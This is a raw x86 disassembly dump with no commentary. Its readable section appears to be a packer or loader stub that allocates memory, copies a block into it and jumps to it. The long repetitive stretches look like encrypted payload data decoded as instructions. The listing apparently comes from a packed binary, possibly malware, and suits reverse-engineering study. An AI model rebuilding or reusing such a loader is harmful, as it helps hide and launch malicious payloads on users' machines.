  4152bc:	push   0x3b
  4152be:	or     BYTE PTR [eax-0x8],dh
  4152c1:	int    0xc4
  4152c3:	jns    0x41531f
  4152c5:	mov    ebx,0xab68e4fa
  4152ca:	push   ecx
  4152cb:	repnz adc DWORD PTR [bp+di-0x891],0xffffff8e
  4152d2:	fsubr  DWORD PTR ds:0x49177aa7
  4152d8:	lods   al,BYTE PTR ds:[esi]
  4152d9:	ins    DWORD PTR es:[edi],dx
  4152da:	cs xchg esi,eax
  4152dc:	push   cs
  4152dd:	cmp    ebx,0x5b6ef750
  4152e3:	mov    dh,BYTE PTR [edx]
  4152e5:	imul   edx,DWORD PTR [ecx+0x6d14bd01],0xa8a2f6d6
  4152ef:	xchg   DWORD PTR [edx-0x64],esi
  4152f2:	scas   al,BYTE PTR es:[edi]
  4152f3:	xor    BYTE PTR [ecx-0x48],al
  4152f6:	xor    edx,DWORD PTR [ebp-0x26335f12]
  4152fc:	pop    ebp
  4152fd:	jge    0x4152f8
  4152ff:	add    BYTE PTR [esi+0x7abd828],dl
  415305:	idiv   DWORD PTR [ebx]
  415307:	push   0x3957b88c
  41530c:	xchg   DWORD PTR [eax+0x5b57eb01],esp
  415312:	cld    
  415313:	xor    DWORD PTR [esi+0x539a18b9],esi
  415319:	fmul   QWORD PTR [ecx]
  41531b:	cmp    BYTE PTR [ebx],bl
  41531d:	cdq    
  41531e:	dec    edi
  41531f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415320:	push   esi
  415321:	pop    ecx
  415322:	(bad)  
  415323:	xlat   BYTE PTR ds:[ebx]
  415324:	xor    cl,0x7d
  415327:	and    al,0x87
  415329:	test   DWORD PTR [ebp+0x33adb81d],esp
  41532f:	add    dh,BYTE PTR [esi+0x4d]
  415332:	loopne 0x415390
  415334:	enter  0xa027,0x1
  415338:	mov    ebx,0x819d2d6b
  41533d:	mov    ds:0x23349924,al
  415342:	pop    ss
  415343:	aas    
  415344:	adc    ah,ah
  415346:	xor    dl,dl
  415348:	dec    ebp
  415349:	sub    eax,0x702c15ff
  41534e:	inc    ecx
  41534f:	add    BYTE PTR [ecx-0x48f02bbb],cl
  415355:	push   ebp
  415356:	aam    0x81
  415358:	cli    
  415359:	cmp    DWORD PTR ds:0x2f750000,eax
  41535f:	mov    DWORD PTR [ebp-0x14],0xe0d
  415366:	lea    eax,[ebp-0x28]
  415369:	push   eax
  41536a:	call   DWORD PTR ds:0x417030
  415370:	mov    DWORD PTR [ebp-0x60],eax
  415373:	mov    DWORD PTR [ebp-0x54],0x3a
  41537a:	mov    BYTE PTR [ebp-0x34],0x0
  41537e:	mov    DWORD PTR [ebp-0x8],0x2df6258c
  415385:	mov    DWORD PTR [ebp-0x68],0x10acf7
  41538c:	jmp    0x415395
  41538e:	mov    BYTE PTR ds:0x419f40,0x0
  415395:	push   0x0
  415397:	call   DWORD PTR ds:0x417030
  41539d:	mov    DWORD PTR [ebp-0x2c],eax
  4153a0:	push   DWORD PTR ds:0x417030
  4153a6:	pop    edx
  4153a7:	mov    DWORD PTR [ebp-0x6c],edx
  4153aa:	lea    ecx,[ebp-0x40]
  4153ad:	push   ecx
  4153ae:	mov    edx,DWORD PTR [ebp-0x60]
  4153b1:	push   edx
  4153b2:	call   DWORD PTR ds:0x417038
  4153b8:	mov    DWORD PTR [ebp-0x44],eax
  4153bb:	push   DWORD PTR [ebp-0x30]
  4153be:	push   0x1000
  4153c3:	mov    eax,DWORD PTR [ebp-0x14]
  4153c6:	add    eax,0x23
  4153c9:	add    eax,0x23
  4153cc:	push   eax
  4153cd:	xor    eax,eax
  4153cf:	push   eax
  4153d0:	mov    ecx,DWORD PTR [ebp-0x44]
  4153d3:	call   ecx
  4153d5:	push   eax
  4153d6:	pop    ecx
  4153d7:	mov    DWORD PTR [ebp-0x4],ecx
  4153da:	mov    eax,DWORD PTR [ebp-0x68]
  4153dd:	sub    eax,0xdae0b
  4153e2:	mov    DWORD PTR [ebp-0x68],eax
  4153e5:	cmp    DWORD PTR [ebp-0x4],0x0
  4153e9:	jne    0x415403
  4153eb:	push   0x0
  4153ed:	push   0x0
  4153ef:	call   0x416aac
  4153f4:	push   0x0
  4153f6:	call   DWORD PTR ds:0x417040
  4153fc:	mov    BYTE PTR ds:0x42fed0,0x0
  415403:	mov    ecx,DWORD PTR [ebp-0x4]
  415406:	add    ecx,DWORD PTR [ebp-0x14]
  415409:	mov    edx,DWORD PTR [ebp-0x8]
  41540c:	mov    DWORD PTR [ecx],edx
  41540e:	mov    eax,DWORD PTR [ebp-0x4]
  415411:	add    eax,DWORD PTR [ebp-0x54]
  415414:	mov    DWORD PTR [ebp-0x5c],eax
  415417:	mov    ecx,DWORD PTR ds:0x417038
  41541d:	mov    DWORD PTR [ebp-0x4c],ecx
  415420:	mov    edx,DWORD PTR [ebp-0x4]
  415423:	add    edx,DWORD PTR [ebp-0x14]
  415426:	mov    eax,DWORD PTR [ebp+0x8]
  415429:	mov    DWORD PTR [edx+0x4],eax
  41542c:	mov    ecx,DWORD PTR [ebp-0x4]
  41542f:	add    ecx,DWORD PTR [ebp-0x14]
  415432:	mov    DWORD PTR [ebp-0xc],ecx
  415435:	cmp    DWORD PTR [ebp-0x68],0x0
  415439:	jbe    0x415456
  41543b:	mov    edx,DWORD PTR [ebp-0xc]
  41543e:	push   edx
  41543f:	mov    eax,DWORD PTR [ebp-0x14]
  415442:	push   eax
  415443:	mov    ecx,DWORD PTR [ebp-0x2c]
  415446:	add    ecx,DWORD PTR [ebp-0x68]
  415449:	push   ecx
  41544a:	mov    edx,DWORD PTR [ebp-0x4]
  41544d:	push   edx
  41544e:	call   0x4169bf
  415453:	add    esp,0x10
  415456:	cmp    DWORD PTR [ebp-0x5c],0x0
  41545a:	je     0x41546a
  41545c:	push   DWORD PTR [ebp-0x4c]
  41545f:	push   DWORD PTR [ebp-0x6c]
  415462:	mov    edx,DWORD PTR [ebp-0x5c]
  415465:	push   eax
  415466:	jmp    edx
  415468:	jmp    0x415470
  41546a:	mov    eax,DWORD PTR [ebp+0x8]
  41546d:	mov    DWORD PTR [ebp-0x18],eax
  415470:	mov    eax,0x1
  415475:	mov    esp,ebp
  415477:	pop    ebp
  415478:	ret    
  415479:	push   ebp
  41547a:	mov    ebp,esp
  41547c:	pop    ebp
  41547d:	ret    
  41547e:	push   ebp
  41547f:	mov    ebp,esp
  415481:	sub    esp,0x54
  415484:	mov    DWORD PTR [ebp-0x34],0x0
  41548b:	mov    DWORD PTR [ebp-0x4],0x0
  415492:	mov    DWORD PTR [ebp-0x50],0x0
  415499:	mov    DWORD PTR [ebp-0x4c],0x0
  4154a0:	mov    DWORD PTR [ebp-0x30],0x0
  4154a7:	lea    eax,[ebp-0x48]
  4154aa:	push   eax
  4154ab:	call   DWORD PTR ds:0x417028
  4154b1:	mov    ecx,DWORD PTR [ebp-0x34]
  4154b4:	push   ecx
  4154b5:	call   0x4154e4
  4154ba:	add    esp,0x4
  4154bd:	call   0x4169b0
  4154c2:	mov    DWORD PTR [ebp-0x54],0x0
  4154c9:	jmp    0x4154d4
  4154cb:	mov    edx,DWORD PTR [ebp-0x54]
  4154ce:	add    edx,0x1
  4154d1:	mov    DWORD PTR [ebp-0x54],edx
  4154d4:	cmp    DWORD PTR [ebp-0x54],0x64
  4154d8:	jae    0x4154dc
  4154da:	jmp    0x4154cb
  4154dc:	xor    eax,eax
  4154de:	mov    esp,ebp
  4154e0:	pop    ebp
  4154e1:	ret    0x10
  4154e4:	push   ebp
  4154e5:	mov    ebp,esp
  4154e7:	sub    esp,0x3c
  4154ea:	push   esi
  4154eb:	mov    DWORD PTR [ebp-0x3c],0x0
  4154f2:	mov    DWORD PTR [ebp-0x38],0x0
  4154f9:	mov    DWORD PTR [ebp-0x30],0x0
  415500:	mov    DWORD PTR [ebp-0x24],0x0
  415507:	mov    DWORD PTR [ebp-0x1c],0x0
  41550e:	mov    DWORD PTR [ebp-0x28],0x0
  415515:	mov    DWORD PTR [ebp-0x2c],0x449408
  41551c:	mov    DWORD PTR [ebp-0x24],0xe1a1d72
  415523:	mov    DWORD PTR [ebp-0x34],0x0
  41552a:	mov    eax,DWORD PTR [ebp-0x24]
  41552d:	mov    DWORD PTR [ebp-0x20],eax
  415530:	mov    DWORD PTR [ebp-0x4],0x0
  415537:	mov    ecx,DWORD PTR ds:0x41702c
  41553d:	mov    DWORD PTR [ebp-0x4],ecx
  415540:	push   0x0
  415542:	push   0x4e
  415544:	push   0x1e
  415546:	push   0x0
  415548:	push   0xffffffff
  41554a:	call   DWORD PTR ds:0x417034
  415550:	test   eax,eax
  415552:	je     0x41698f
  415558:	jecxz  0x415585
  41555a:	xchg   ecx,eax
  41555b:	push   esp
  41555c:	(bad)  
  41555f:	leave  
  415560:	pushf  
  415561:	dec    ebx
  415562:	mov    ah,0xaa
  415564:	lock push ecx
  415566:	jno    0x415569
  415568:	in     al,dx
  415569:	(bad)  
  41556a:	cld    
  41556b:	repz leave 
  41556d:	cwde   
  41556e:	dec    ebx
  41556f:	mov    ah,0xea
  415571:	xsaveopt [ecx+0x1]
  415575:	push   esp
  415576:	(bad)  
  415577:	cld    
  415578:	repz leave 
  41557a:	cwde   
  41557b:	dec    ebx
  41557c:	mov    ah,0xaa
  41557e:	xsaveopt [ecx+0x1]
  415582:	push   esp
  415583:	(bad)  
  415584:	cld    
  415585:	repz leave 
  415587:	cwde   
  415588:	dec    ebx
  415589:	mov    ah,0xaa
  41558b:	xsaveopt [ecx+0x1]
  41558f:	push   esp
  415590:	(bad)  
  415591:	cld    
  415592:	repz leave 
  415594:	nop
  415595:	dec    edx
  415596:	mov    ah,0xaa
  415598:	add    DWORD PTR [ecx+0x72540fcb],esi
  41559e:	cmc    
  41559f:	ds call 0x68399fc5
  4155a5:	cs cli 
  4155a7:	sbb    DWORD PTR [eax+0x27],ebp
  4155aa:	out    0x8c,al
  4155ac:	and    DWORD PTR [esi-0x382ac601],0x6f10cd2f
  4155b6:	cmp    ch,BYTE PTR [ecx-0x2542c78]
  4155bc:	imul   eax,esi,0xffffffdf
  4155bf:	popa   
  4155c0:	mov    ds,WORD PTR [eax]
  4155c2:	outs   dx,DWORD PTR ds:[esi]
  4155c3:	je     0x415547
  4155c5:	mov    bl,0xa0
  4155c7:	jmp    0xd0117ac1
  4155cc:	and    DWORD PTR [ebx-0x398ff484],esp
  4155d2:	cld    
  4155d3:	repz leave 
  4155d5:	cwde   
  4155d6:	dec    ebx
  4155d7:	mov    ah,0xd0
  4155d9:	sar    BYTE PTR [eax-0x4105c001],0x21
  4155e0:	int    0x67
  4155e2:	loopne 0x41557a
  4155e4:	mov    al,BYTE PTR [edi+esi*2]
  4155e7:	jae    0x41563d
  4155e9:	xor    dh,BYTE PTR [edx-0x4ea221e5]
  4155ef:	inc    ebp
  4155f0:	outs   dx,BYTE PTR ds:[esi]
  4155f1:	xchg   DWORD PTR [eax-0x2e],edi
  4155f4:	adc    edi,ebx
  4155f6:	jns    0x415581
  4155f8:	jecxz  0x4155c9
  4155fa:	and    BYTE PTR [ecx*4+0x5e77cce5],dl
  415601:	jbe    0x4155a5
  415603:	fsubr  QWORD PTR [edi+0x68]
  415606:	test   BYTE PTR [esi],ch
  415608:	dec    BYTE PTR [esi-0x50]
  41560b:	imul   ebx,DWORD PTR [ebp+0x36acd6a1],0xd6212d82
  415615:	addr16 loopne 0x4155ae
  415618:	mov    al,BYTE PTR [esi+esi*2]
  41561b:	jae    0x415655
  41561d:	scas   al,BYTE PTR es:[edi]
  41561e:	sub    al,0x1b
  415620:	ds jge 0x4155c6
  415623:	inc    ebp
  415624:	jnp    0x415640
  415626:	rcl    dl,cl
  415628:	mov    eax,DWORD PTR [edx-0x2a]
  41562b:	mov    DWORD PTR [edi-0x42eb74ae],edi
  415631:	js     0x415689
  415633:	ja     0x415665
  415635:	add    BYTE PTR [ecx],cl
  415637:	fdiv   QWORD PTR [ecx-0xb]
  41563a:	sbb    DWORD PTR [esi],ebp
  41563c:	div    BYTE PTR [esi]
  41563e:	xor    ebp,DWORD PTR [ecx-0x8]
  415641:	data16 int 0x19
  415644:	aas    
  415645:	cli    
  415646:	mov    esi,0x98c9f321
  41564b:	dec    ebx
  41564c:	mov    ah,0xaa
  41564e:	xsaveopt [ecx+0x1]
  415652:	push   esp
  415653:	(bad)  
  415654:	cld    
  415655:	repz leave 
  415657:	cwde   
  415658:	dec    ebx
  415659:	mov    ah,0xaa
  41565b:	xsaveopt [ecx+0x1]
  41565f:	push   esp
  415660:	xchg   esi,eax
  415661:	mov    ecx,0x4ad4c9f3
  415666:	mov    bh,0xaa
  415668:	imul   esp,eax,0xc6544e3c
  41566e:	cld    
  41566f:	repz leave 
  415671:	cwde   
  415672:	dec    ebx
  415673:	mov    ah,0x4a
  415675:	shrd   DWORD PTR [eax+0xa],esi,0x55
  41567a:	int3   
  41567b:	cld    
  41567c:	repz sub ebx,DWORD PTR [ebx+ecx*2-0x51f6d14c]
  415684:	jno    0x415687
  415686:	push   esp
  415687:	(bad)  
  415688:	mov    edi,0x4b98c94e
  41568d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41568e:	stos   BYTE PTR es:[edi],al
  41568f:	xsaveopt [ecx+0x4]
  415693:	push   esp
  415694:	(bad)  
  415695:	cld    
  415696:	mov    bl,0xc9
  415698:	cwde   
  415699:	pop    ebx
  41569a:	mov    ah,0xaa
  41569c:	shrd   DWORD PTR [ecx+0x1],esi,0x51
  4156a1:	(bad)  
  4156a2:	std    
  4156a3:	repz leave 
  4156a5:	cwde   
  4156a6:	dec    ebx
  4156a7:	mov    ah,0xaf
  4156a9:	imul   esi,DWORD PTR [ecx+0x1]
  4156ad:	push   esp
  4156ae:	(bad)  
  4156af:	cld    
  4156b0:	repz stc 
  4156b2:	xchg   esp,eax
  4156b3:	dec    ebx
  4156b4:	mov    ah,0xae
  4156b6:	clflush BYTE PTR [ebx-0x1]
  4156ba:	push   eax
  4156bb:	(bad)  
  4156bc:	(bad)  
  4156bd:	xrelease mov DWORD PTR [ecx],ebx
  4156c0:	dec    ebx
  4156c1:	mov    ah,0xba
  4156c3:	xsave  [ecx+0x1]
  4156c7:	push   esp
  4156c8:	(bad)  
  4156c9:	cld    
  4156ca:	jecxz  0x415695
  4156cc:	cwde   
  4156cd:	pop    ebx
  4156ce:	mov    ah,0xaa
  4156d0:	xsaveopt [ecx+0x1]
  4156d4:	inc    esp
  4156d5:	(bad)  
  4156d6:	cld    
  4156d7:	repz leave 
  4156d9:	cwde   
  4156da:	dec    ebx
  4156db:	mov    ah,0xaa
  4156dd:	xsaveopt [ecx+0x5]
  4156e1:	push   esp
  4156e2:	retf   0xaafc
  4156e5:	retf   0x4b98
  4156e8:	mov    ah,0x6a
  4156ea:	add    al,0xae
  4156ec:	and    al,0x3e
  4156ee:	push   esp
  4156ef:	(bad)  
  4156f0:	cld    
  4156f1:	repz leave 
  4156f3:	cwde   
  4156f4:	dec    ebx
  4156f5:	mov    ah,0xaa
  4156f7:	xsaveopt [ecx+0x1]
  4156fb:	push   esp
  4156fc:	(bad)  
  4156fd:	cld    
  4156fe:	repz leave 
  415700:	cwde   
  415701:	imul   edi,DWORD PTR [eax+0x71ae17aa],0x1
  415708:	push   esp
  415709:	(bad)  
  41570a:	cld    
  41570b:	repz leave 
  41570d:	cwde   
  41570e:	dec    ebx
  41570f:	mov    ah,0xaa
  415711:	xsaveopt [ecx+0x1]
  415715:	push   esp
  415716:	(bad)  
  415717:	cld    
  415718:	repz leave 
  41571a:	cwde   
  41571b:	dec    ebx
  41571c:	mov    ah,0xaa
  41571e:	xsaveopt [ecx+0x1]
  415722:	push   esp
  415723:	(bad)  
  415724:	cld    
  415725:	repz leave 
  415727:	cwde   
  415728:	dec    ebx
  415729:	mov    ah,0xaa
  41572b:	xsaveopt [ecx+0x1]
  41572f:	push   esp
  415730:	(bad)  
  415731:	cld    
  415732:	repz leave 
  415734:	cwde   
  415735:	dec    ebx
  415736:	mov    ah,0xaa
  415738:	xsaveopt [ecx+0x1]
  41573c:	push   esp
  41573d:	(bad)  
  41573e:	cld    
  41573f:	repz leave 
  415741:	cwde   
  415742:	dec    ebx
  415743:	mov    ah,0xaa
  415745:	xsaveopt [ecx+0x1]
  415749:	push   esp
  41574a:	(bad)  
  41574b:	cld    
  41574c:	repz leave 
  41574e:	cwde   
  41574f:	dec    ebx
  415750:	mov    ah,0xaa
  415752:	xsaveopt [ecx+0x1]
  415756:	push   esp
  415757:	(bad)  
  415758:	rol    BYTE PTR [edi-0x4bc01f54],cl
  41575e:	stos   BYTE PTR es:[edi],al
  41575f:	(bad)  
  415761:	ror    DWORD PTR [edx],0x54
  415764:	(bad)  
  415765:	in     al,dx
  415766:	repz leave 
  415768:	cwde   
  415769:	sub    eax,0xaa0faab0
  41576e:	jno    0x415771
  415770:	add    al,0x83
  415772:	mov    edi,0x4bd79dc1
  415777:	mov    ah,0xaa
  415779:	xsaveopt [ecx+0x21]
  41577d:	push   esp
  41577e:	(bad)  
  41577f:	sbb    al,0xdd
  415781:	mov    ebx,0xaad739eb
  415786:	xsaveopt [ecx+0x61]
  41578a:	push   esp
  41578b:	(bad)  
  41578c:	cld    
  41578d:	xor    eax,edx
  41578f:	cwde   
  415790:	dec    ebx
  415791:	out    0xaa,al
  415793:	stmxcsr DWORD PTR [ebx]
  415796:	add    eax,0xf3fcc654
  41579b:	leave  
  41579c:	cwde   
  41579d:	dec    ebx
  41579e:	mov    ah,0xaa
  4157a0:	xsaveopt [ecx+0x1]
  4157a4:	je     0x41576c
  4157a6:	cld    
  4157a7:	adc    esp,edi
  4157a9:	jmp    0x71ae:0x6cc5d82e
  4157b0:	add    DWORD PTR [esi-0x3a],edx
  4157b3:	cld    
  4157b4:	repz jmp 0xa8f5a34e
  4157ba:	xsaveopt [ecx-0x43]
  4157be:	push   eax
  4157bf:	(bad)  
  4157c0:	cld    
  4157c1:	repz leave 
  4157c3:	cwde   
  4157c4:	dec    ebx
  4157c5:	mov    ah,0xaa
  4157c7:	xsaveopt [ecx+0x1]
  4157cb:	push   esp
  4157cc:	xchg   ah,bh
  4157ce:	repz or DWORD PTR [eax+0xfaab44b],ebx
  4157d5:	scas   al,BYTE PTR es:[edi]
  4157d6:	jno    0x4157d9
  4157d8:	push   esp
  4157d9:	(bad)  
  4157da:	cld    
  4157db:	repz leave 
  4157dd:	cwde   
  4157de:	dec    ebx
  4157df:	mov    ah,0xaa
  4157e1:	xsaveopt [ecx+0x1]
  4157e5:	push   esp
  4157e6:	(bad)  
  4157e7:	cld    
  4157e8:	repz leave 
  4157ea:	cwde   
  4157eb:	dec    ebx
  4157ec:	mov    ah,0xaa
  4157ee:	xsaveopt [ecx+0x1]
  4157f2:	push   esp
  4157f3:	(bad)  
  4157f4:	cld    
  4157f5:	repz leave 
  4157f7:	cwde   
  4157f8:	dec    ebx
  4157f9:	mov    ah,0xaa
  4157fb:	xsaveopt [ecx+0x1]
  4157ff:	push   esp
  415800:	(bad)  
  415801:	cld    
  415802:	repz leave 
  415804:	cwde   
  415805:	dec    ebx
  415806:	mov    ah,0xaa
  415808:	xsaveopt [ecx+0x1]
  41580c:	push   esp
  41580d:	(bad)  
  41580e:	cld    
  41580f:	repz leave 
  415811:	cwde   
  415812:	dec    ebx
  415813:	mov    ah,0xaa
  415815:	xsaveopt [ecx+0x1]
  415819:	push   esp
  41581a:	(bad)  
  41581b:	cld    
  41581c:	repz leave 
  41581e:	cwde   
  41581f:	dec    ebx
  415820:	mov    ah,0xaa
  415822:	xsaveopt [ecx+0x1]
  415826:	push   esp
  415827:	(bad)  
  415828:	cld    
  415829:	repz leave 
  41582b:	cwde   
  41582c:	dec    ebx
  41582d:	mov    ah,0xaa
  41582f:	xsaveopt [ecx+0x1]
  415833:	push   esp
  415834:	(bad)  
  415835:	cld    
  415836:	repz leave 
  415838:	cwde   
  415839:	dec    ebx
  41583a:	mov    ah,0xaa
  41583c:	xsaveopt [ecx+0x1]
  415840:	push   esp
  415841:	(bad)  
  415842:	cld    
  415843:	repz leave 
  415845:	cwde   
  415846:	dec    ebx
  415847:	mov    ah,0xaa
  415849:	xsaveopt [ecx+0x1]
  41584d:	push   esp
  41584e:	(bad)  
  41584f:	cld    
  415850:	repz leave 
  415852:	cwde   
  415853:	dec    ebx
  415854:	mov    ah,0xaa
  415856:	xsaveopt [ecx+0x1]
  41585a:	push   esp
  41585b:	(bad)  
  41585c:	cld    
  41585d:	repz leave 
  41585f:	cwde   
  415860:	dec    ebx
  415861:	mov    ah,0xaa
  415863:	xsaveopt [ecx+0x1]
  415867:	push   esp
  415868:	(bad)  
  415869:	cld    
  41586a:	repz leave 
  41586c:	cwde   
  41586d:	dec    ebx
  41586e:	mov    ah,0xaa
  415870:	xsaveopt [ecx+0x1]
  415874:	push   esp
  415875:	(bad)  
  415876:	cld    
  415877:	repz leave 
  415879:	cwde   
  41587a:	dec    ebx
  41587b:	mov    ah,0xaa
  41587d:	xsaveopt [ecx+0x1]
  415881:	push   esp
  415882:	(bad)  
  415883:	cld    
  415884:	repz leave 
  415886:	cwde   
  415887:	dec    ebx
  415888:	mov    ah,0xaa
  41588a:	xsaveopt [ecx+0x1]
  41588e:	push   esp
  41588f:	(bad)  
  415890:	cld    
  415891:	repz leave 
  415893:	cwde   
  415894:	dec    ebx
  415895:	mov    ah,0xaa
  415897:	xsaveopt [ecx+0x1]
  41589b:	push   esp
  41589c:	(bad)  
  41589d:	cld    
  41589e:	repz leave 
  4158a0:	cwde   
  4158a1:	dec    ebx
  4158a2:	mov    ah,0xaa
  4158a4:	xsaveopt [ecx+0x1]
  4158a8:	push   esp
  4158a9:	(bad)  
  4158aa:	cld    
  4158ab:	repz leave 
  4158ad:	cwde   
  4158ae:	dec    ebx
  4158af:	mov    ah,0xaa
  4158b1:	xsaveopt [ecx+0x1]
  4158b5:	push   esp
  4158b6:	(bad)  
  4158b7:	cld    
  4158b8:	repz leave 
  4158ba:	cwde   
  4158bb:	dec    ebx
  4158bc:	mov    ah,0xaa
  4158be:	xsaveopt [ecx+0x1]
  4158c2:	push   esp
  4158c3:	(bad)  
  4158c4:	cld    
  4158c5:	repz leave 
  4158c7:	cwde   
  4158c8:	dec    ebx
  4158c9:	mov    ah,0xaa
  4158cb:	xsaveopt [ecx+0x1]
  4158cf:	push   esp
  4158d0:	(bad)  
  4158d1:	cld    
  4158d2:	repz leave 
  4158d4:	cwde   
  4158d5:	dec    ebx
  4158d6:	mov    ah,0xaa
  4158d8:	xsaveopt [ecx+0x1]
  4158dc:	push   esp
  4158dd:	(bad)  
  4158de:	cld    
  4158df:	repz leave 
  4158e1:	cwde   
  4158e2:	dec    ebx
  4158e3:	mov    ah,0xaa
  4158e5:	xsaveopt [ecx+0x1]
  4158e9:	push   esp
  4158ea:	(bad)  
  4158eb:	cld    
  4158ec:	repz leave 
  4158ee:	cwde   
  4158ef:	dec    ebx
  4158f0:	mov    ah,0xaa
  4158f2:	xsaveopt [ecx+0x1]
  4158f6:	push   esp
  4158f7:	(bad)  
  4158f8:	cld    
  4158f9:	repz leave 
  4158fb:	cwde   
  4158fc:	dec    ebx
  4158fd:	mov    ah,0xaa
  4158ff:	xsaveopt [ecx+0x1]
  415903:	push   esp
  415904:	(bad)  
  415905:	cld    
  415906:	repz leave 
  415908:	cwde   
  415909:	dec    ebx
  41590a:	mov    ah,0xaa
  41590c:	xsaveopt [ecx+0x1]
  415910:	push   esp
  415911:	(bad)  
  415912:	cld    
  415913:	repz leave 
  415915:	cwde   
  415916:	dec    ebx
  415917:	mov    ah,0xaa
  415919:	xsaveopt [ecx+0x1]
  41591d:	push   esp
  41591e:	(bad)  
  41591f:	cld    
  415920:	repz leave 
  415922:	cwde   
  415923:	dec    ebx
  415924:	mov    ah,0xaa
  415926:	xsaveopt [ecx+0x1]
  41592a:	push   esp
  41592b:	(bad)  
  41592c:	cld    
  41592d:	repz leave 
  41592f:	cwde   
  415930:	dec    ebx
  415931:	mov    ah,0xaa
  415933:	xsaveopt [ecx+0x1]
  415937:	push   esp
  415938:	(bad)  
  415939:	cld    
  41593a:	repz leave 
  41593c:	cwde   
  41593d:	dec    ebx
  41593e:	mov    ah,0xaa
  415940:	xsaveopt [ecx+0x1]
  415944:	push   esp
  415945:	(bad)  
  415946:	cld    
  415947:	repz leave 
  415949:	cwde   
  41594a:	dec    ebx
  41594b:	mov    ah,0xaa
  41594d:	xsaveopt [ecx+0x1]
  415951:	push   esp
  415952:	(bad)  
  415953:	cld    
  415954:	repz leave 
  415956:	cwde   
  415957:	dec    ebx
  415958:	pop    ds
  415959:	in     al,0x4
  41595b:	scas   al,BYTE PTR es:[edi]
  41595c:	pop    esi
  41595d:	add    DWORD PTR [esi+edx*8-0x4],edx
  415961:	repz jecxz 0x41599e
  415964:	xchg   ecx,eax
  415965:	rcl    BYTE PTR [edi],0x40
  415968:	popf   
  415969:	arpl   WORD PTR [edx],bp
  41596b:	outs   dx,DWORD PTR ds:[esi]
  41596c:	sti    
  41596d:	adc    eax,DWORD PTR [esi+0x5b]
  415970:	sahf   
  415971:	add    ch,ch
  415973:	pop    ebx
  415974:	rcr    DWORD PTR ds:0x2f6f4662,cl
  41597a:	and    al,0x78
  41597c:	mov    ebp,ecx
  41597e:	mov    DWORD PTR [esi-0x1b],ecx
  415981:	cwde   
  415982:	lock scas al,BYTE PTR es:[edi]
  415984:	aad    0x14
  415986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415987:	xchg   ecx,eax
  415988:	adc    BYTE PTR [edx+0x49],dh
  41598b:	outs   dx,BYTE PTR ds:[esi]
  41598c:	mul    DWORD PTR [ebx-0x399d179]
  415992:	je     0x415993
  415994:	les    esi,FWORD PTR [eax+0x6c0cd4cb]
  41599a:	ss fsub st,st(1)
  41599d:	dec    edi
  41599e:	mov    dl,0xa2
  4159a0:	xor    ah,ch
  4159a2:	in     al,0x87
  4159a4:	imul   ebx,DWORD PTR [ecx],0xbee836db
  4159aa:	out    dx,al
  4159ab:	icebp  
  4159ac:	(bad)  
  4159ad:	cld    
  4159ae:	push   ecx
  4159af:	jbe    0x415933
  4159b1:	fs loope 0x415a0f
  4159b4:	dec    esp
  4159b5:	cmp    DWORD PTR cs:[ebp-0x511e3020],ebp
  4159bc:	(bad)  
  4159bd:	int    0xd8
  4159bf:	mov    esi,0x41b2ce92
  4159c4:	or     al,0x39
  4159c6:	add    DWORD PTR [ecx+0x8],esi
  4159c9:	(bad)  
  4159ca:	cwde   
  4159cb:	adc    BYTE PTR [ebx-0x5f],0xcf
  4159cf:	lods   eax,DWORD PTR ds:[esi]
  4159d0:	and    al,0x55
  4159d2:	and    al,dh
  4159d4:	and    ah,BYTE PTR [edi-0x6f]
  4159d7:	mov    dl,0x81
  4159d9:	test   al,0x23
  4159db:	mov    ds,WORD PTR [edx+0x3e]
  4159de:	(bad)  
  4159e0:	leave  
  4159e1:	mov    ah,0x9a
  4159e3:	aad    0x9f
  4159e5:	push   es
  4159e6:	iret   
  4159e7:	and    ebp,ebp
  4159e9:	xchg   BYTE PTR [edi+0x45],dl
  4159ec:	ds je  0x415a4b
  4159ef:	mov    bl,bh
  4159f1:	fisubr DWORD PTR [ebx-0x64]
  4159f4:	add    DWORD PTR [ebp+edx*1+0xcfa53e8],0x3a3c350c
  4159ff:	xor    al,BYTE PTR [ebp-0xdc480a8]
  415a05:	add    eax,0x38fb49c0
  415a0a:	fsub   DWORD PTR [eax-0x10]
  415a0d:	call   FWORD PTR [edi+eiz*1-0x79]
  415a11:	imul   esp,DWORD PTR [esi+0x5bf63822],0x5b
  415a18:	nop
  415a19:	cmp    ebp,DWORD PTR [edi+eiz*1+0x62f1bf47]
  415a20:	mov    bh,BYTE PTR [edi+0x1b]
  415a23:	push   esp
  415a24:	sub    bh,BYTE PTR [esi+0x3b0e1b51]
  415a2a:	push   cs
  415a2b:	data16 adc ah,BYTE PTR [ecx+0x197cbd0]
  415a32:	int3   
  415a33:	mov    edx,0xe4304024
  415a38:	cdq    
  415a39:	adc    bl,al
  415a3b:	adc    eax,0x51b742f
  415a40:	xor    al,0x54
  415a42:	xor    al,0x24
  415a44:	xchg   edi,eax
  415a45:	dec    eax
  415a46:	pop    ecx
  415a47:	xchg   DWORD PTR [eax+0x782bafb],ecx
  415a4d:	and    ch,ah
  415a4f:	fild   WORD PTR [esi]
  415a51:	lds    ecx,FWORD PTR [eax+0x5c]
  415a54:	fisub  WORD PTR [edx+edx*1-0x27]
  415a58:	aaa    
  415a59:	gs jbe 0x415a2d
  415a5c:	dec    edx
  415a5d:	inc    ebp
  415a5e:	cmp    al,BYTE PTR [ecx]
  415a60:	bound  eax,QWORD PTR [eax]
  415a62:	mov    esi,0x77563cc4
  415a67:	pop    edx
  415a68:	scas   al,BYTE PTR es:[edi]
  415a69:	adc    al,0xaa
  415a6b:	lds    eax,FWORD PTR [ebp+edi*4-0x4a4e95ee]
  415a72:	sub    DWORD PTR [edx-0x2b],esp
  415a75:	jl     0x415a50
  415a77:	adc    eax,0x94af7db1
  415a7c:	and    DWORD PTR [esi+0x59400afd],0xaac3048b
  415a86:	loop   0x415a9d
  415a88:	fist   DWORD PTR [ebx]
  415a8a:	sbb    esi,esp
  415a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a8d:	aas    
  415a8e:	cli    
  415a8f:	dec    ebp
  415a90:	(bad)  
  415a91:	jbe    0x415a32
  415a93:	jmp    0x85a8:0x2aa5f392
  415a9a:	add    al,0x24
  415a9c:	cli    
  415a9d:	fstp   QWORD PTR fs:[edi]
  415aa0:	mov    eax,0x26ecd2fc
  415aa5:	enter  0x826e,0xdc
  415aa9:	mov    DWORD PTR [edi+0x4],ebx
